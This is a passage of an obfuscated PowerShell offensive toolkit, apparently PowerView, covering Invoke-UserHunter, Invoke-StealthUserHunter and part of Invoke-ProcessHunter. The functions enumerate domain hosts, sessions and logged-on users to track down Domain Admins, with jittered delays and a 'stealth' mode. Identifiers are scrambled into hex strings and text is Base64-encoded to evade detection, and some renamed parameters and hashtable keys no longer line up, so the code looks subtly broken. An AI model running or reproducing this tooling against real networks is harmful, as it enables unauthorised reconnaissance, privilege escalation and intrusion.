                ${545f21adf3dd4446ae88a7522b7e07fb}[${54f0f90d304b49e0b0a156b6e8abba98}].EndInvoke(${2fa99fb7e9e54d3c9369349abd41bd21}[${54f0f90d304b49e0b0a156b6e8abba98}])
            } catch {
                Write-Warning "error: $_"
            }
            finally {
                ${545f21adf3dd4446ae88a7522b7e07fb}[${54f0f90d304b49e0b0a156b6e8abba98}].Dispose()
            }
        }
        ${c299401952124696bc03c96496906578}.Dispose()
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAIAB0AGgAcgBlAGEAZABzACAAYwBvAG0AcABsAGUAdABlAGQAIQA=')))
    }
}
function Invoke-UserHunter {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        ${c096522c7bbe4c7aaadf99843e3b09fb},
        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        ${b58b7e66c34147d0b1030dea35e43084},
        [String]
        ${a2fbc6e3cd88453ea35f8017927b51ae},
        [String]
        ${c4ea8c745d00425ab685ca6107c29659},
        [Switch]
        ${d94ab56af5434f32a3756027d2d13aa3},
        [String]
        ${a0852a4c33684bf0877105c6da3a9074} = 'Domain Admins',
        [String]
        ${da7be972f7e44ec9875f40715ba00f6d},
        [String]
        ${dfa85e24773f431f91e73de068d7b94e},
        [String]
        ${d5a2a8c2315d401eac23f9bae417dc38},
        [String]
        ${a6a10db45a0941659422112bc7aa06f5},
        [ValidateScript({Test-Path -Path $_ })]
        [String]
        ${a57452fb8a9b43bcb40eaf9289200401},
        [Switch]
        ${c158a3a278cc485f9b7a13755fb2e250},
        [Switch]
        ${a5828792c4a845028f178e4eb1f82d63},
        [Switch]
        ${d9e004161fe34be091ab7c5ba6578f58},
        [Switch]
        ${cc7ef2f10c2142c5907263cb65776e2c},
        [Switch]
        ${e6e5f48677934e8a9b673971d54cb88b},
        [UInt32]
        ${b8c8aa64938b4bac902fc98afa97c067} = 0,
        [Double]
        ${d4ce8c8227174786a6c6642ad7a1cbfb} = .3,
        [String]
        ${afa30c601e734738b32424a6234484e4},
        [String]
        ${a3bf4f2494234d89b62febc9f379f624},
        [Switch]
        ${b48dbad4885b4800980979010426b8fd},
        [Switch]
        ${e9a66cc9388c4a9b8dd06d6ed60e1b0f},
        [Switch]
        ${c19acdc49644499ab2223cded055a19f},
        [String]
        [ValidateSet("DFS","DC","File","All")]
        ${dd96433453094da08c24a8d715ec8727} ="All",
        [Switch]
        ${b1118cdf8d5c47b6b5026cc372e778f3},
        [ValidateRange(1,100)] 
        [Int]
        ${af65be9c26e74dca807a99d4facf1a11}
    )
    begin {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA==')))]) {
            $DebugPreference = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABpAG4AdQBlAA==')))
        }
        ${a000573bb5614405b8a5a68467724c29} = New-Object System.Random
        Write-Verbose "[*] Running Invoke-UserHunter with delay of ${b8c8aa64938b4bac902fc98afa97c067}"
        if(${afa30c601e734738b32424a6234484e4}) {
            ${575c90e058ca4f27b93edf3f2aea5074} = @(${afa30c601e734738b32424a6234484e4})
        }
        elseif(${e9a66cc9388c4a9b8dd06d6ed60e1b0f}) {
            ${575c90e058ca4f27b93edf3f2aea5074} = Get-NetForestDomain | % { $_.Name }
        }
        else {
            ${575c90e058ca4f27b93edf3f2aea5074} = @( (Get-NetDomain).name )
        }
        if(!${c096522c7bbe4c7aaadf99843e3b09fb}) { 
            [Array]${c096522c7bbe4c7aaadf99843e3b09fb} = @()
            if(${b58b7e66c34147d0b1030dea35e43084}) {
                ${c096522c7bbe4c7aaadf99843e3b09fb} = gc -Path ${b58b7e66c34147d0b1030dea35e43084}
            }
            elseif(${c19acdc49644499ab2223cded055a19f}) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGUAYQBsAHQAaAAgAG0AbwBkAGUAIQAgAEUAbgB1AG0AZQByAGEAdABpAG4AZwAgAGMAbwBtAG0AbwBuAGwAeQAgAHUAcwBlAGQAIABzAGUAcgB2AGUAcgBzAA==')))
                Write-Verbose "Stealth source: ${dd96433453094da08c24a8d715ec8727}"
                ForEach (${afa30c601e734738b32424a6234484e4} in ${575c90e058ca4f27b93edf3f2aea5074}) {
                    if ((${dd96433453094da08c24a8d715ec8727} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQA=')))) -or (${dd96433453094da08c24a8d715ec8727} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwA'))))) {
                        Write-Verbose "[*] Querying domain ${afa30c601e734738b32424a6234484e4} for File Servers..."
                        ${c096522c7bbe4c7aaadf99843e3b09fb} += Get-NetFileServer -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624}
                    }
                    if ((${dd96433453094da08c24a8d715ec8727} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABGAFMA')))) -or (${dd96433453094da08c24a8d715ec8727} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwA'))))) {
                        Write-Verbose "[*] Querying domain ${afa30c601e734738b32424a6234484e4} for DFS Servers..."
                        ${c096522c7bbe4c7aaadf99843e3b09fb} += Get-DFSshare -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624} | % {$_.RemoteServerName}
                    }
                    if ((${dd96433453094da08c24a8d715ec8727} -eq "DC") -or (${dd96433453094da08c24a8d715ec8727} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwA'))))) {
                        Write-Verbose "[*] Querying domain ${afa30c601e734738b32424a6234484e4} for Domain Controllers..."
                        ${c096522c7bbe4c7aaadf99843e3b09fb} += Get-NetDomainController -e22191a1db5b4c5bba42c2b9674b00a8 -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624} | % { $_.dnshostname}
                    }
                }
            }
            else {
                ForEach (${afa30c601e734738b32424a6234484e4} in ${575c90e058ca4f27b93edf3f2aea5074}) {
                    Write-Verbose "[*] Querying domain ${afa30c601e734738b32424a6234484e4} for hosts"
                    ${8ebfdee9dc57408c84cf62adfbe82d8c} = @{
                        'Domain' = ${afa30c601e734738b32424a6234484e4}
                        'DomainController' = ${a3bf4f2494234d89b62febc9f379f624}
                        'ADSpath' = ${c4d5e29aa5ae43dc97a75d43cbc64f02}
                        'Filter' = ${a2fbc6e3cd88453ea35f8017927b51ae}
                        'Unconstrained' = ${d94ab56af5434f32a3756027d2d13aa3}
                    }
                    ${c096522c7bbe4c7aaadf99843e3b09fb} += Get-NetComputer @8ebfdee9dc57408c84cf62adfbe82d8c
                }
            }
            ${c096522c7bbe4c7aaadf99843e3b09fb} = ${c096522c7bbe4c7aaadf99843e3b09fb} | ? { $_ } | sort -Unique | sort { Get-Random }
            if($(${c096522c7bbe4c7aaadf99843e3b09fb}.Count) -eq 0) {
                throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvACAAaABvAHMAdABzACAAZgBvAHUAbgBkACEA')))
            }
        }
        ${bec7b23274ab4068b5f2614783a89d47} = @()
        ${6a5f9684eaec4c58a85ca186a23bb216} = ([Environment]::UserName).toLower()
        if(${b48dbad4885b4800980979010426b8fd} -or ${b1118cdf8d5c47b6b5026cc372e778f3}) {
            ${d98950af3033419194b20c9afd35b025} = New-Object PSObject
            ${d98950af3033419194b20c9afd35b025} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIARABvAG0AYQBpAG4A'))) $Null
            ${d98950af3033419194b20c9afd35b025} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIATgBhAG0AZQA='))) '*'
            ${bec7b23274ab4068b5f2614783a89d47} = @(${d98950af3033419194b20c9afd35b025})
            if(${b1118cdf8d5c47b6b5026cc372e778f3}) {
                ${cc2420eb798d48239d9b46fef5f248f6} = Convert-CanonicaltoNT4 -d812a92a48c94a1ab80bf8ce2384cab2 "krbtgt@$(${afa30c601e734738b32424a6234484e4})"
                ${ca2cc0cf76ab43aea5857aa904c921c1} = ${cc2420eb798d48239d9b46fef5f248f6}.split("\")[0]
            }
        }
        elseif(${da7be972f7e44ec9875f40715ba00f6d}) {
            Write-Verbose "Querying target server '${da7be972f7e44ec9875f40715ba00f6d}' for local users"
            ${bec7b23274ab4068b5f2614783a89d47} = Get-NetLocalGroup ${da7be972f7e44ec9875f40715ba00f6d} -d722399685d842b19fa5d48261792164 | ? {(-not $_.IsGroup) -and $_.IsDomain } | % {
                ${d98950af3033419194b20c9afd35b025} = New-Object PSObject
                ${d98950af3033419194b20c9afd35b025} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIARABvAG0AYQBpAG4A'))) ($_.AccountName).split("/")[0].toLower() 
                ${d98950af3033419194b20c9afd35b025} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIATgBhAG0AZQA='))) ($_.AccountName).split("/")[1].toLower() 
                ${d98950af3033419194b20c9afd35b025}
            }  | ? {$_}
        }
        elseif(${dfa85e24773f431f91e73de068d7b94e}) {
            Write-Verbose "[*] Using target user '${dfa85e24773f431f91e73de068d7b94e}'..."
            ${d98950af3033419194b20c9afd35b025} = New-Object PSObject
            ${d98950af3033419194b20c9afd35b025} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIARABvAG0AYQBpAG4A'))) ${575c90e058ca4f27b93edf3f2aea5074}[0]
            ${d98950af3033419194b20c9afd35b025} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIATgBhAG0AZQA='))) ${dfa85e24773f431f91e73de068d7b94e}.ToLower()
            ${bec7b23274ab4068b5f2614783a89d47} = @(${d98950af3033419194b20c9afd35b025})
        }
        elseif(${a57452fb8a9b43bcb40eaf9289200401}) {
            ${bec7b23274ab4068b5f2614783a89d47} = gc -Path ${a57452fb8a9b43bcb40eaf9289200401} | % {
                ${d98950af3033419194b20c9afd35b025} = New-Object PSObject
                ${d98950af3033419194b20c9afd35b025} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIARABvAG0AYQBpAG4A'))) ${575c90e058ca4f27b93edf3f2aea5074}[0]
                ${d98950af3033419194b20c9afd35b025} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIATgBhAG0AZQA='))) $_
                ${d98950af3033419194b20c9afd35b025}
            }  | ? {$_}
        }
        elseif(${a6a10db45a0941659422112bc7aa06f5} -or ${d5a2a8c2315d401eac23f9bae417dc38} -or ${c158a3a278cc485f9b7a13755fb2e250}) {
            ForEach (${afa30c601e734738b32424a6234484e4} in ${575c90e058ca4f27b93edf3f2aea5074}) {
                ${8ebfdee9dc57408c84cf62adfbe82d8c} = @{
                    'Domain' = ${afa30c601e734738b32424a6234484e4}
                    'DomainController' = ${a3bf4f2494234d89b62febc9f379f624}
                    'ADSpath' = ${a6a10db45a0941659422112bc7aa06f5}
                    'Filter' = ${d5a2a8c2315d401eac23f9bae417dc38}
                    'AdminCount' = ${c158a3a278cc485f9b7a13755fb2e250}
                    'AllowDelegation' = ${a5828792c4a845028f178e4eb1f82d63}
                }
                Write-Verbose "[*] Querying domain ${afa30c601e734738b32424a6234484e4} for users"
                ${bec7b23274ab4068b5f2614783a89d47} += Get-NetUser @8ebfdee9dc57408c84cf62adfbe82d8c | % {
                    ${d98950af3033419194b20c9afd35b025} = New-Object PSObject
                    ${d98950af3033419194b20c9afd35b025} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIARABvAG0AYQBpAG4A'))) ${afa30c601e734738b32424a6234484e4}
                    ${d98950af3033419194b20c9afd35b025} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIATgBhAG0AZQA='))) $_.samaccountname
                    ${d98950af3033419194b20c9afd35b025}
                }  | ? {$_}
            }            
        }
        else {
            ForEach (${afa30c601e734738b32424a6234484e4} in ${575c90e058ca4f27b93edf3f2aea5074}) {
                Write-Verbose "[*] Querying domain ${afa30c601e734738b32424a6234484e4} for users of group '${a0852a4c33684bf0877105c6da3a9074}'"
                ${bec7b23274ab4068b5f2614783a89d47} += Get-NetGroupMember -a0852a4c33684bf0877105c6da3a9074 ${a0852a4c33684bf0877105c6da3a9074} -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624}
            }
        }
        if (( (-not ${b48dbad4885b4800980979010426b8fd}) -and (-not ${b1118cdf8d5c47b6b5026cc372e778f3}) ) -and ((!${bec7b23274ab4068b5f2614783a89d47}) -or (${bec7b23274ab4068b5f2614783a89d47}.Count -eq 0))) {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABOAG8AIAB1AHMAZQByAHMAIABmAG8AdQBuAGQAIAB0AG8AIABzAGUAYQByAGMAaAAgAGYAbwByACEA')))
        }
        ${59a37d6213694042882ad9072c1f5a73} = {
            param(${c096522c7bbe4c7aaadf99843e3b09fb}, ${be0265651b1f4b6699aaa7db34ab7aee}, ${bec7b23274ab4068b5f2614783a89d47}, ${6a5f9684eaec4c58a85ca186a23bb216}, ${c19acdc49644499ab2223cded055a19f}, ${ca2cc0cf76ab43aea5857aa904c921c1})
            ${4ec9c050c4c74ff6a6d4be971e455652} = $True
            if(${be0265651b1f4b6699aaa7db34ab7aee}) {
                ${4ec9c050c4c74ff6a6d4be971e455652} = Test-Connection -Count 1 -Quiet -ComputerName ${c096522c7bbe4c7aaadf99843e3b09fb}
            }
            if(${4ec9c050c4c74ff6a6d4be971e455652}) {
                if(!${ca2cc0cf76ab43aea5857aa904c921c1}) {
                    ${87e5bad804cb4e57aec8b5af7b4dda62} = Get-NetSession -c096522c7bbe4c7aaadf99843e3b09fb ${c096522c7bbe4c7aaadf99843e3b09fb}
                    ForEach ($Session in ${87e5bad804cb4e57aec8b5af7b4dda62}) {
                        ${dfa85e24773f431f91e73de068d7b94e} = $Session.sesi10_username
                        ${3f64a952b7924514a953cd320dbe0eca} = $Session.sesi10_cname
                        if(${3f64a952b7924514a953cd320dbe0eca} -and ${3f64a952b7924514a953cd320dbe0eca}.StartsWith("\\")) {
                            ${3f64a952b7924514a953cd320dbe0eca} = ${3f64a952b7924514a953cd320dbe0eca}.TrimStart("\")
                        }
                        if ((${dfa85e24773f431f91e73de068d7b94e}) -and (${dfa85e24773f431f91e73de068d7b94e}.trim() -ne '') -and (!(${dfa85e24773f431f91e73de068d7b94e} -match ${6a5f9684eaec4c58a85ca186a23bb216}))) {
                            ${bec7b23274ab4068b5f2614783a89d47} | ? {${dfa85e24773f431f91e73de068d7b94e} -like $_.MemberName} | % {
                                ${536942de8aa042b59c537409948bd2c0} = Get-IPAddress -c096522c7bbe4c7aaadf99843e3b09fb ${c096522c7bbe4c7aaadf99843e3b09fb}
                                ${c0e6fa6e60b144689e10d663d368c097} = New-Object PSObject
                                ${c0e6fa6e60b144689e10d663d368c097} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA='))) $_.MemberDomain
                                ${c0e6fa6e60b144689e10d663d368c097} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) ${dfa85e24773f431f91e73de068d7b94e}
                                ${c0e6fa6e60b144689e10d663d368c097} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${c096522c7bbe4c7aaadf99843e3b09fb}
                                ${c0e6fa6e60b144689e10d663d368c097} | Add-Member Noteproperty 'IP' ${536942de8aa042b59c537409948bd2c0}
                                ${c0e6fa6e60b144689e10d663d368c097} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBGAHIAbwBtAA=='))) ${3f64a952b7924514a953cd320dbe0eca}
                                if (${d9e004161fe34be091ab7c5ba6578f58}) {
                                    ${f7e71a33cd8441aea65ea7213f784401} = Invoke-CheckLocalAdminAccess -c096522c7bbe4c7aaadf99843e3b09fb ${3f64a952b7924514a953cd320dbe0eca}
                                    ${c0e6fa6e60b144689e10d663d368c097} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAEEAZABtAGkAbgA='))) ${f7e71a33cd8441aea65ea7213f784401}
                                }
                                else {
                                    ${c0e6fa6e60b144689e10d663d368c097} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAEEAZABtAGkAbgA='))) $Null
                                }
                                ${c0e6fa6e60b144689e10d663d368c097}
                            }
                        }                                    
                    }
                }
                if(!${c19acdc49644499ab2223cded055a19f}) {
                    ${841ab7e757414bb09b555b7f65b66904} = Get-NetLoggedon -c096522c7bbe4c7aaadf99843e3b09fb ${c096522c7bbe4c7aaadf99843e3b09fb}
                    ForEach (${d98950af3033419194b20c9afd35b025} in ${841ab7e757414bb09b555b7f65b66904}) {
                        ${dfa85e24773f431f91e73de068d7b94e} = ${d98950af3033419194b20c9afd35b025}.wkui1_username
                        ${18b79adcf53e4640aa89d56a339ec1d0} = ${d98950af3033419194b20c9afd35b025}.wkui1_logon_domain
                        if ((${dfa85e24773f431f91e73de068d7b94e}) -and (${dfa85e24773f431f91e73de068d7b94e}.trim() -ne '')) {
                            ${bec7b23274ab4068b5f2614783a89d47} | ? {${dfa85e24773f431f91e73de068d7b94e} -like $_.MemberName} | % {
                                ${95716aaf4fba465e830fd1d94f8280a3} = $True
                                if(${ca2cc0cf76ab43aea5857aa904c921c1}) {
                                    if (${ca2cc0cf76ab43aea5857aa904c921c1}.ToLower() -ne ${18b79adcf53e4640aa89d56a339ec1d0}.ToLower()) {
                                        ${95716aaf4fba465e830fd1d94f8280a3} = $True
                                    }
                                    else {
                                        ${95716aaf4fba465e830fd1d94f8280a3} = $False
                                    }
                                }
                                if(${95716aaf4fba465e830fd1d94f8280a3}) {
                                    ${536942de8aa042b59c537409948bd2c0} = Get-IPAddress -c096522c7bbe4c7aaadf99843e3b09fb ${c096522c7bbe4c7aaadf99843e3b09fb}
                                    ${c0e6fa6e60b144689e10d663d368c097} = New-Object PSObject
                                    ${c0e6fa6e60b144689e10d663d368c097} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA='))) ${18b79adcf53e4640aa89d56a339ec1d0}
                                    ${c0e6fa6e60b144689e10d663d368c097} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) ${dfa85e24773f431f91e73de068d7b94e}
                                    ${c0e6fa6e60b144689e10d663d368c097} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${c096522c7bbe4c7aaadf99843e3b09fb}
                                    ${c0e6fa6e60b144689e10d663d368c097} | Add-Member Noteproperty 'IP' ${536942de8aa042b59c537409948bd2c0}
                                    ${c0e6fa6e60b144689e10d663d368c097} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBGAHIAbwBtAA=='))) $Null
                                    if (${d9e004161fe34be091ab7c5ba6578f58}) {
                                        ${f7e71a33cd8441aea65ea7213f784401} = Invoke-CheckLocalAdminAccess -c096522c7bbe4c7aaadf99843e3b09fb ${c096522c7bbe4c7aaadf99843e3b09fb}
                                        ${c0e6fa6e60b144689e10d663d368c097} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAEEAZABtAGkAbgA='))) ${f7e71a33cd8441aea65ea7213f784401}
                                    }
                                    else {
                                        ${c0e6fa6e60b144689e10d663d368c097} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAEEAZABtAGkAbgA='))) $Null
                                    }
                                    ${c0e6fa6e60b144689e10d663d368c097}
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    process {
        if(${af65be9c26e74dca807a99d4facf1a11}) {
            Write-Verbose "Using threading with threads = ${af65be9c26e74dca807a99d4facf1a11}"
            ${9bbea18b6b074c14aeae828437f12380} = @{
                'Ping' = $(-not ${e6e5f48677934e8a9b673971d54cb88b})
                'TargetUsers' = ${bec7b23274ab4068b5f2614783a89d47}
                'CurrentUser' = ${6a5f9684eaec4c58a85ca186a23bb216}
                'Stealth' = ${c19acdc49644499ab2223cded055a19f}
                'DomainShortName' = ${ca2cc0cf76ab43aea5857aa904c921c1}
            }
            Invoke-ThreadedFunction -c096522c7bbe4c7aaadf99843e3b09fb ${c096522c7bbe4c7aaadf99843e3b09fb} -ba541df15a284a3187207310217a6e04 ${59a37d6213694042882ad9072c1f5a73} -eeeefbd7f1ac43118ed9ac4a4cb9dd01 ${9bbea18b6b074c14aeae828437f12380}
        }
        else {
            if(-not ${e6e5f48677934e8a9b673971d54cb88b} -and (${c096522c7bbe4c7aaadf99843e3b09fb}.count -ne 1)) {
                ${be0265651b1f4b6699aaa7db34ab7aee} = {param(${c096522c7bbe4c7aaadf99843e3b09fb}) if(Test-Connection -ComputerName ${c096522c7bbe4c7aaadf99843e3b09fb} -Count 1 -Quiet -ErrorAction Stop){${c096522c7bbe4c7aaadf99843e3b09fb}}}
                ${c096522c7bbe4c7aaadf99843e3b09fb} = Invoke-ThreadedFunction -e0be29f777aa4bc98faa14015f17190f -c096522c7bbe4c7aaadf99843e3b09fb ${c096522c7bbe4c7aaadf99843e3b09fb} -ba541df15a284a3187207310217a6e04 ${be0265651b1f4b6699aaa7db34ab7aee} -af65be9c26e74dca807a99d4facf1a11 100
            }
            Write-Verbose "[*] Total number of active hosts: $(${c096522c7bbe4c7aaadf99843e3b09fb}.count)"
            ${6a1d2d10aeb941458787cbe1335cc6ce} = 0
            ForEach (${5c10572590774a67ad57cb4f99935a3e} in ${c096522c7bbe4c7aaadf99843e3b09fb}) {
                ${6a1d2d10aeb941458787cbe1335cc6ce} = ${6a1d2d10aeb941458787cbe1335cc6ce} + 1
                sleep -Seconds ${a000573bb5614405b8a5a68467724c29}.Next((1-${d4ce8c8227174786a6c6642ad7a1cbfb})*${b8c8aa64938b4bac902fc98afa97c067}, (1+${d4ce8c8227174786a6c6642ad7a1cbfb})*${b8c8aa64938b4bac902fc98afa97c067})
                Write-Verbose "[*] Enumerating server ${5c10572590774a67ad57cb4f99935a3e} (${6a1d2d10aeb941458787cbe1335cc6ce} of $(${c096522c7bbe4c7aaadf99843e3b09fb}.count))"
                ${934af845da6e4eb0a5370de6d7b8da04} = icm -ScriptBlock ${59a37d6213694042882ad9072c1f5a73} -ArgumentList ${5c10572590774a67ad57cb4f99935a3e}, $False, ${bec7b23274ab4068b5f2614783a89d47}, ${6a5f9684eaec4c58a85ca186a23bb216}, ${c19acdc49644499ab2223cded055a19f}, ${ca2cc0cf76ab43aea5857aa904c921c1}
                ${934af845da6e4eb0a5370de6d7b8da04}
                if(${934af845da6e4eb0a5370de6d7b8da04} -and ${cc7ef2f10c2142c5907263cb65776e2c}) {
                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABUAGEAcgBnAGUAdAAgAHUAcwBlAHIAIABmAG8AdQBuAGQALAAgAHIAZQB0AHUAcgBuAGkAbgBnACAAZQBhAHIAbAB5AA==')))
                    return
                }
            }
        }
    }
}
function Invoke-StealthUserHunter {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        ${c096522c7bbe4c7aaadf99843e3b09fb},
        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        ${b58b7e66c34147d0b1030dea35e43084},
        [String]
        ${a2fbc6e3cd88453ea35f8017927b51ae},
        [String]
        ${c4ea8c745d00425ab685ca6107c29659},
        [String]
        ${a0852a4c33684bf0877105c6da3a9074} = 'Domain Admins',
        [String]
        ${da7be972f7e44ec9875f40715ba00f6d},
        [String]
        ${dfa85e24773f431f91e73de068d7b94e},
        [String]
        ${d5a2a8c2315d401eac23f9bae417dc38},
        [String]
        ${a6a10db45a0941659422112bc7aa06f5},
        [ValidateScript({Test-Path -Path $_ })]
        [String]
        ${a57452fb8a9b43bcb40eaf9289200401},
        [Switch]
        ${d9e004161fe34be091ab7c5ba6578f58},
        [Switch]
        ${cc7ef2f10c2142c5907263cb65776e2c},
        [Switch]
        ${e6e5f48677934e8a9b673971d54cb88b},
        [UInt32]
        ${b8c8aa64938b4bac902fc98afa97c067} = 0,
        [Double]
        ${d4ce8c8227174786a6c6642ad7a1cbfb} = .3,
        [String]
        ${afa30c601e734738b32424a6234484e4},
        [Switch]
        ${b48dbad4885b4800980979010426b8fd},
        [Switch]
        ${e9a66cc9388c4a9b8dd06d6ed60e1b0f},
        [String]
        [ValidateSet("DFS","DC","File","All")]
        ${dd96433453094da08c24a8d715ec8727} ="All"
    )
    Invoke-UserHunter -c19acdc49644499ab2223cded055a19f @PSBoundParameters
}
function Invoke-ProcessHunter {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        ${c096522c7bbe4c7aaadf99843e3b09fb},
        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        ${b58b7e66c34147d0b1030dea35e43084},
        [String]
        ${a2fbc6e3cd88453ea35f8017927b51ae},
        [String]
        ${c4ea8c745d00425ab685ca6107c29659},
        [String]
        ${a21a03a3d1ba4bbd8408c19660646dc4},
        [String]
        ${a0852a4c33684bf0877105c6da3a9074} = 'Domain Admins',
        [String]
        ${da7be972f7e44ec9875f40715ba00f6d},
        [String]
        ${dfa85e24773f431f91e73de068d7b94e},
        [String]
        ${d5a2a8c2315d401eac23f9bae417dc38},
        [String]
        ${a6a10db45a0941659422112bc7aa06f5},
        [ValidateScript({Test-Path -Path $_ })]
        [String]
        ${a57452fb8a9b43bcb40eaf9289200401},
        [String]
        ${aa4e10a6a5fe4cc19679c3039fa02e52},
        [String]
        ${a3f847eaa4054bfaa0b1a0725f444c0d},
        [Switch]
        ${cc7ef2f10c2142c5907263cb65776e2c},
        [Switch]
        ${e6e5f48677934e8a9b673971d54cb88b},
        [UInt32]
        ${b8c8aa64938b4bac902fc98afa97c067} = 0,
        [Double]
        ${d4ce8c8227174786a6c6642ad7a1cbfb} = .3,
        [String]
        ${afa30c601e734738b32424a6234484e4},
        [String]
        ${a3bf4f2494234d89b62febc9f379f624},
        [Switch]
        ${b48dbad4885b4800980979010426b8fd},
        [Switch]
        ${e9a66cc9388c4a9b8dd06d6ed60e1b0f},
        [ValidateRange(1,100)] 
        [Int]
        ${af65be9c26e74dca807a99d4facf1a11}
    )
    begin {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA==')))]) {
            $DebugPreference = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABpAG4AdQBlAA==')))
        }
        ${a000573bb5614405b8a5a68467724c29} = New-Object System.Random
        Write-Verbose "[*] Running Invoke-ProcessHunter with delay of ${b8c8aa64938b4bac902fc98afa97c067}"
        if(${afa30c601e734738b32424a6234484e4}) {
            ${575c90e058ca4f27b93edf3f2aea5074} = @(${afa30c601e734738b32424a6234484e4})
        }
        elseif(${e9a66cc9388c4a9b8dd06d6ed60e1b0f}) {
            ${575c90e058ca4f27b93edf3f2aea5074} = Get-NetForestDomain | % { $_.Name }
        }
        else {
            ${575c90e058ca4f27b93edf3f2aea5074} = @( (Get-NetDomain).name )
        }
        if(!${c096522c7bbe4c7aaadf99843e3b09fb}) { 
            if(${b58b7e66c34147d0b1030dea35e43084}) {
                ${c096522c7bbe4c7aaadf99843e3b09fb} = gc -Path ${b58b7e66c34147d0b1030dea35e43084}
            }
            else {
                [array]${c096522c7bbe4c7aaadf99843e3b09fb} = @()
                ForEach (${afa30c601e734738b32424a6234484e4} in ${575c90e058ca4f27b93edf3f2aea5074}) {
                    Write-Verbose "[*] Querying domain ${afa30c601e734738b32424a6234484e4} for hosts"
                    ${c096522c7bbe4c7aaadf99843e3b09fb} += Get-NetComputer -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624} -a48507564a8248e5b01d3a563f4bc865 ${a2fbc6e3cd88453ea35f8017927b51ae} -c4d5e29aa5ae43dc97a75d43cbc64f02 ${c4ea8c745d00425ab685ca6107c29659}
                }
